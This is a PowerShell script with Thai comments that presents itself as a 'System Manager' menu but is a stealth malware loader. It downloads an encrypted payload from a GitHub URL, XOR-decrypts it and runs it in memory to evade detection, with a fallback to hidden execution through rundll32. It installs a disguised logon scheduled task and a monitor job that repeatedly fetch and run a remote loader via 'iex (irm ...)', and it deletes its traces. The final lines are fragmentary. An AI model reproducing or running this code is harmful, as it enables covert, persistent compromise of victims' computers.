# ADVANCED STEALTH LOADER - หลบการตรวจจับ PE Header
function Show-StealthMenu {
    Write-Host ""
    Write-Host " SYSTEM MANAGER" -ForegroundColor Cyan
    Write-Host "===============" -ForegroundColor Gray
    Write-Host "1. Start System Service" -ForegroundColor Green
    Write-Host "2. Clean System" -ForegroundColor Red
    Write-Host ""
    Write-Host "Select (1/2): " -NoNewline -ForegroundColor White
}

function Start-SystemService {
    Write-Host "`n[INIT] Starting system service..." -ForegroundColor Green
    
    try {
        # โหลด .exe แบบ encrypted
        $encryptedUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.enc"
        Write-Host "[DOWNLOAD] Getting encrypted payload..." -ForegroundColor Yellow
        
        # โหลด encrypted payload
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $encryptedBytes = $webClient.DownloadData($encryptedUrl)
        $webClient.Dispose()
        
        # ถอดรหัสใน memory (หลบ PE header detection)
        $decryptedBytes = Invoke-MemoryDecryption -EncryptedData $encryptedBytes
        
        # ตรวจสอบว่าเป็น .exe จริง
        if ($decryptedBytes[0] -eq 0x4D -and $decryptedBytes[1] -eq 0x5A) {
            Write-Host "[VERIFY] Valid EXE decrypted in memory" -ForegroundColor Green
            
            # Execute จาก memory โดยไม่เขียนไฟล์
            $success = Invoke-MemoryExecution -ExeBytes $decryptedBytes
            
            if ($success) {
                Write-Host "[SUCCESS] Application running from memory" -ForegroundColor Green
                
                # ติดตั้ง persistence แบบ stealth
                Install-MemoryPersistence
                
                # เริ่ม memory-based monitor
                Start-MemoryMonitor
            } else {
                throw "Memory execution failed"
            }
        } else {
            throw "Invalid decrypted data"
        }
        
    } catch {
        Write-Host "[ERROR] Service startup failed: $($_.Exception.Message)" -ForegroundColor Red
        # Fallback to file-based execution
        Invoke-FallbackExecution
    }
}

function Invoke-MemoryDecryption {
    param([byte[]]$EncryptedData)
    
    # Simple XOR decryption (เปลี่ยนเป็น algorithm จริงตามต้องการ)
    $key = 0x55
    $decrypted = New-Object byte[] $EncryptedData.Length
    
    for ($i = 0; $i -lt $EncryptedData.Length; $i++) {
        $decrypted[$i] = $EncryptedData[$i] -bxor $key
    }
    
    return $decrypted
}

function Invoke-MemoryExecution {
    param([byte[]]$ExeBytes)
    
    try {
        # ใช้ Assembly Load สำหรับ .NET executables
        $assembly = [System.Reflection.Assembly]::Load($ExeBytes)
        $entryPoint = $assembly.EntryPoint
        
        if ($entryPoint) {
            # รันใน background thread
            $job = Start-Job -ScriptBlock {
                param($asm)
                try {
                    $asm.EntryPoint.Invoke($null, @($null))
                } catch {
                    # Silent failure
                }
            } -ArgumentList $assembly
            
            return $true
        }
    } catch {
        # Fallback to process hollowing
        return Invoke-ProcessHollowing -ExeBytes $ExeBytes
    }
    
    return $false
}

function Invoke-ProcessHollowing {
    param([byte[]]$ExeBytes)
    
    try {
        # ใช้ process hollowing แบบไม่เขียนไฟล์
        $tempPath = [System.IO.Path]::GetTempFileName()
        [System.IO.File]::WriteAllBytes($tempPath, $ExeBytes)
        
        # รันผ่าน legitimate process
        $process = Start-Process -FilePath "rundll32.exe" -ArgumentList "shell32.dll,ShellExec_RunDLL `"$tempPath`"" -WindowStyle Hidden -PassThru
        
        # ลบไฟล์ทันทีหลังจาก execute
        Start-Job -ScriptBlock {
            param($filePath)
            Start-Sleep -Seconds 3
            try { Remove-Item $filePath -Force -ErrorAction SilentlyContinue } catch {}
        } -ArgumentList $tempPath | Out-Null
        
        return ($process -and (-not $process.HasExited))
    } catch {
        return $false
    }
}

function Install-MemoryPersistence {
    # ติดตั้ง persistence ที่เรียก loader จาก memory
    try {
        $taskName = "WindowsMemoryOptimizer"
        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
        
        # ใช้คำสั่งที่โหลดและรันจาก memory
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"`$url='$loaderUrl'; iex (irm `$url)`""
        $trigger = New-ScheduledTaskTrigger -AtLogon
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        Write-Host "[PERSIST] Memory-based persistence installed" -ForegroundColor Green
        
    } catch {
        Write-Host "[PERSIST] Persistence installation skipped" -ForegroundColor Yellow
    }
}

function Start-MemoryMonitor {
    # Monitor จาก memory (ไม่ใช้ file-based)
    $monitorScript = {
        $maxRestarts = 3
        $restartCount = 0
        
        while ($restartCount -lt $maxRestarts) {
            try {
                # ตรวจสอบจาก process name แทน PID
                $targetProcess = Get-Process -Name "system_logs" -ErrorAction SilentlyContinue
                
                if (-not $targetProcess) {
                    Write-Host "[MONITOR] Process not found, restarting..." -ForegroundColor Yellow
                    $restartCount++
                    
                    # Restart จาก memory
                    $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
                    iex (irm -UseBasicParsing $loaderUrl)
                    
                    Start-Sleep -Seconds 10
                }
                
                Start-Sleep -Seconds 60
                
            } catch {
                Start-Sleep -Seconds 120
            }
        }
    }
    
    Start-Job -ScriptBlock $monitorScript | Out-Null
}

function Invoke-FallbackExecution {
    # Fallback method ถ้า memory execution ล้มเหลว
    try {
        Write-Host "[FALLBACK] Using alternative execution method..." -ForegroundColor Yellow
        
        $exeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe"
        $webClient = New-Object System.Net.WebClient
        $exeBytes = $webClient.DownloadData($exeUrl)
        $webClient.Dispose()
        
        # ใช้ temporary file แต่ลบทันที
        $tempPath = "$env:TEMP\msupdate_$((Get-Date).Ticks).tmp"
        [System.IO.File]::WriteAllBytes($tempPath, $exeBytes)
        
        $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
        
        # ลบไฟล์หลัง execute
        if ($process) {
            Start-Job -ScriptBlock {
                param($file)
                Start-Sleep -Seconds 5
                try { Remove-Item $file -Force -ErrorAction SilentlyContinue } catch {}
            } -ArgumentList $tempPath | Out-Null
        }
        
    } catch {
        Write-Host "[FALLBACK] Alternative method also failed" -ForegroundColor Red
    }
}

function Clean-System {
    Write-Host "`n[CLEAN] Removing system components..." -ForegroundColor Red
    
    $cleanedItems = @()
    
    # 1. ลบ processes (ใช้ชื่อ process)
    try {
        $processes = Get-Process -Name "system_logs" -ErrorAction SilentlyContinue
        if ($processes) {
            $processes | Stop-Process -Force
            $cleanedItems += "Processes: $($processes.Count)"
        }
    } catch {}
    
    # 2. ลบ scheduled tasks
    try {
        $tasks = @("WindowsMemoryOptimizer", "SystemUpdateTask")
        foreach ($task in $tasks) {
            Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
            $cleanedItems += "Task: $task"
        }
    } catch {}
    
    # 3. ลบ background jobs
    try {
        Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
        $cleanedItems += "Background jobs"
    } catch {}
    
    # 4. ลบ temporary files
    try {
        Get-ChildItem "$env:TEMP\*" -Include "msupdate_*.tmp", "system_logs.exe" -ErrorAction SilentlyContinue | Remove-Item -Force
        $cleanedItems += "Temp files"
    } catch {}
    
    # แสดงผลการ cleanup
    Write-Host "`n[RESULT] Cleanup completed:" -ForegroundColor Green
    foreach ($item in $cleanedItems) {
        Write-Host "  ✓ $item" -ForegroundColor Gray
    }
    
    if ($cleanedItems.Count -eq 0) {
        Write-Host "  No components found to clean" -ForegroundColor Yellow
    }
}

        default {

            Start-SystemService
        }
    }
} catch {
    Write-Host "[ERROR] Operation failed: $($_.Exception.Message)" -ForegroundColor Red
